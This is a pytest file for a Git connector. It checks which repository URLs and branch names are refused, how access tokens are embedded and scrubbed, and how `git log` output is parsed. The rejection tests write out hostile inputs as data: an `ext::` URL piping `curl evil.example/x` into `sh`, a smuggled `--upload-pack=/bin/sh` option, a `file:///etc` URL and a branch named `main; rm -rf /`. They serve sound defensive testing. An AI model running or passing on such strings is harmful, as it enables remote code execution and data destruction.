"""
Tests for the connector framework and the Git connector.

Nothing here runs git or touches a network. What is tested is the part that
decides whether a connector is safe to run and what it makes of the output:
which repository URLs are accepted, how a token is put into one and kept out
of messages, and how `git log` output is turned back into commits.

The URL tests are the important ones. A repository URL is set by a project
owner, and git's `ext::` transport turns one into arbitrary command
execution, so "which URLs are refused" is a security boundary, not a
preference.
"""

import pytest

from toogather import connectors
from toogather.connectors import base
from toogather.connectors.base import Context
from toogather.connectors.git import (
    _FIELD,
    _RECORD,
    GitConnector,
    authenticated_url,
    batch_title,
    branch_problem,
    parse_log,
    repo_url_problem,
    scrub,
    summarise,
)

# ---------------------------------------------------------------------
# The registry
# ---------------------------------------------------------------------


def test_git_is_registered_and_found_by_kind():
    assert connectors.get("git") is not None
    assert connectors.get("git").kind == "git"


def test_an_unknown_kind_returns_none_rather_than_raising():
    """A connector row can outlive the class that served it."""
    assert connectors.get("jira") is None


def test_available_lists_every_connector():
    assert "git" in {c.kind for c in connectors.available()}


def test_registering_something_without_a_kind_is_refused():
    class Nameless(base.Connector):
        def fetch(self, ctx):  # pragma: no cover - never reached
            return base.FetchResult()

    with pytest.raises(ValueError):
        connectors.register(Nameless())


# ---------------------------------------------------------------------
# Which repositories may be used
# ---------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "https://github.com/team/warehouse.git",
    "http://gitea.internal:3000/team/warehouse.git",
    "ssh://git@github.com/team/warehouse.git",
    "git@github.com:team/warehouse.git",
])
def test_ordinary_repository_urls_are_accepted(url):
    assert repo_url_problem(url) is None


@pytest.mark.parametrize("url", [
    "ext::sh -c 'curl evil.example/x|sh'",   # git's ext:: transport runs commands
    "file:///etc",                            # would read repositories on the server
    "/var/lib/git/private.git",               # same, as a bare path
    "--upload-pack=/bin/sh",                  # an option smuggled into the URL slot
    "",
])
def test_dangerous_repository_urls_are_refused(url):
    assert repo_url_problem(url) is not None


def test_branch_names_with_shell_characters_are_refused():
    assert branch_problem("main") is None
    assert branch_problem("release/2024-03") is None
    assert branch_problem("") is None                     # means "the default branch"
    assert branch_problem("--upload-pack=x") is not None
    assert branch_problem("main; rm -rf /") is not None


def test_config_problem_reports_a_missing_url():
    assert GitConnector().config_problem({"repo_url": ""}) is not None


def test_config_problem_passes_a_good_setup():
    good = {"repo_url": "https://github.com/team/warehouse.git", "branch": "main"}
    assert GitConnector().config_problem(good) is None


# ---------------------------------------------------------------------
# Recovering from a clone that died partway
# ---------------------------------------------------------------------


def _subcommand(args):
    """
    The git subcommand in an argument list.

    Most calls are prefixed with `-C <path>` to run inside the mirror, so the
    subcommand is not reliably the first element.
    """
    return args[2] if args[0] == "-C" else args[0]


def _ctx(workdir):
    return Context(connector_id="cid", project_id="pid", workdir=workdir,
                   config={"repo_url": "https://host/r.git"})


def test_an_incomplete_mirror_is_cleared_before_cloning_again(tmp_path, monkeypatch):
    """
    A clone killed midway leaves a directory with no HEAD in it. git then
    refuses that path forever ("already exists and is not an empty
    directory"), which wedged the connector with no way out but deleting the
    volume by hand. The remains have to be cleared first.
    """
    connector = GitConnector()
    stale = tmp_path / "cid.git"
    (stale / "objects").mkdir(parents=True)
    (stale / "objects" / "half-written").write_text("junk")
    assert not (stale / "HEAD").exists()

    subcommands: list[str] = []

    def fake_git(args, ctx, token=""):
        subcommands.append(_subcommand(args))
        if args[0] == "clone":
            # Stand in for a clone that works this time round.
            stale.mkdir(parents=True, exist_ok=True)
            (stale / "HEAD").write_text("ref: refs/heads/main\n")
        return ""

    monkeypatch.setattr(connector, "_git", fake_git)
    connector._mirror(_ctx(tmp_path), "https://host/r.git", "")

    assert subcommands[0] == "clone", f"expected a fresh clone, got {subcommands}"
    assert not (stale / "objects" / "half-written").exists(), "the remains were not cleared"


def test_a_healthy_mirror_is_fetched_not_recloned(tmp_path, monkeypatch):
    connector = GitConnector()
    good = tmp_path / "cid.git"
    good.mkdir(parents=True)
    (good / "HEAD").write_text("ref: refs/heads/main\n")

    subcommands: list[str] = []
    monkeypatch.setattr(
        connector, "_git",
        lambda args, ctx, token="": subcommands.append(_subcommand(args)) or "")
    connector._mirror(_ctx(tmp_path), "https://host/r.git", "")

    assert "clone" not in subcommands
    assert "fetch" in subcommands


# ---------------------------------------------------------------------
# Tokens
# ---------------------------------------------------------------------


def test_a_token_is_put_into_an_https_url():
    url = authenticated_url("https://github.com/team/repo.git", "ghp_secret")
    assert url == "https://x-access-token:ghp_secret@github.com/team/repo.git"


def test_a_token_is_percent_encoded_so_it_cannot_change_the_host():
    """A token containing @ or / must not be able to redirect the fetch."""
    url = authenticated_url("https://github.com/team/repo.git", "ab@evil.example/x")
    assert url.endswith("@github.com/team/repo.git")
    assert "ab%40evil.example%2Fx" in url


def test_an_existing_username_in_the_url_is_replaced():
    url = authenticated_url("https://someone@github.com/team/repo.git", "tok")
    assert url.count("@") == 1
    assert "someone" not in url


def test_ssh_urls_are_left_alone():
    """ssh authenticates with a key; there is nowhere to put a token."""
    assert authenticated_url("ssh://git@host/repo.git", "tok") == "ssh://git@host/repo.git"


def test_scrub_removes_a_token_from_a_message_in_both_forms():
    message = "failed for https://x-access-token:ab%40c@host and raw ab@c"
    assert "ab@c" not in scrub(message, "ab@c")
    assert "ab%40c" not in scrub(message, "ab@c")


# ---------------------------------------------------------------------
# Reading git log output
# ---------------------------------------------------------------------


def _record(sha, author, date, subject, body, files):
    """One record in the format the connector asks git for."""
    return (_RECORD + _FIELD.join([sha, author, date, subject, body])
            + _FIELD + "\n" + "\n".join(files) + "\n")


def test_a_commit_is_read_back_field_by_field():
    raw = _record("4f2a1c9" + "0" * 33, "Budi Santoso", "2024-03-12",
                  "Add batch numbering", "Agreed in the 12 March meeting.",
                  ["warehouse/batch.py"])
    commit = parse_log(raw)[0]
    assert commit.author == "Budi Santoso"
    assert commit.date == "2024-03-12"
    assert commit.subject == "Add batch numbering"
    assert commit.body == "Agreed in the 12 March meeting."
    assert commit.files == ("warehouse/batch.py",)
    assert commit.short == "4f2a1c90"


def test_a_multi_line_body_does_not_swallow_the_file_list():
    """
    The body can contain newlines, which is exactly why the file list is
    separated from it by a field marker rather than by guessing.
    """
    raw = _record("a" * 40, "Siti", "2024-03-13", "Fix mapping",
                  "First line.\n\nSecond paragraph.", ["a.py", "b.py"])
    commit = parse_log(raw)[0]
    assert commit.body == "First line.\n\nSecond paragraph."
    assert commit.files == ("a.py", "b.py")


def test_several_commits_come_back_in_order():
    raw = (_record("a" * 40, "Budi", "2024-03-12", "First", "", ["a.py"])
           + _record("b" * 40, "Siti", "2024-03-13", "Second", "", ["b.py"]))
    assert [c.subject for c in parse_log(raw)] == ["First", "Second"]


def test_empty_output_gives_no_commits():
    assert parse_log("") == []
    assert parse_log("\n") == []


def test_a_commit_with_no_files_is_still_read():
    raw = _RECORD + _FIELD.join(["c" * 40, "Budi", "2024-03-12", "Empty", ""]) + _FIELD
    commit = parse_log(raw)[0]
    assert commit.files == ()


# ---------------------------------------------------------------------
# Writing the commits up
# ---------------------------------------------------------------------


def test_the_summary_says_where_it_started_from():
    commits = parse_log(_record("a" * 40, "Budi", "2024-03-12", "First", "", ["a.py"]))
    text = summarise(commits, "https://host/repo.git", "main", since="b" * 40)
    assert "since bbbbbbbb" in text
    assert "1 new commit" in text
    assert "a.py" in text


def test_a_first_run_says_it_is_a_first_run():
    commits = parse_log(_record("a" * 40, "Budi", "2024-03-12", "First", "", []))
    text = summarise(commits, "https://host/repo.git", "main")
    assert "first check" in text


def test_a_backlog_says_more_are_waiting():
    commits = parse_log(_record("a" * 40, "Budi", "2024-03-12", "First", "", []))
    text = summarise(commits, "https://host/repo.git", "main", more_waiting=True)
    assert "next check" in text


def test_the_title_names_one_commit_or_counts_many():
    one = parse_log(_record("a" * 40, "Budi", "2024-03-12", "Add batch numbering", "", []))
    assert batch_title(one, "main") == "Git main: aaaaaaaa Add batch numbering"

    many = parse_log(
        _record("a" * 40, "Budi", "2024-03-12", "First", "", [])
        + _record("b" * 40, "Siti", "2024-03-13", "Second", "", [])
    )
    assert batch_title(many, "main") == "Git main: 2 commits aaaaaaaa..bbbbbbbb"
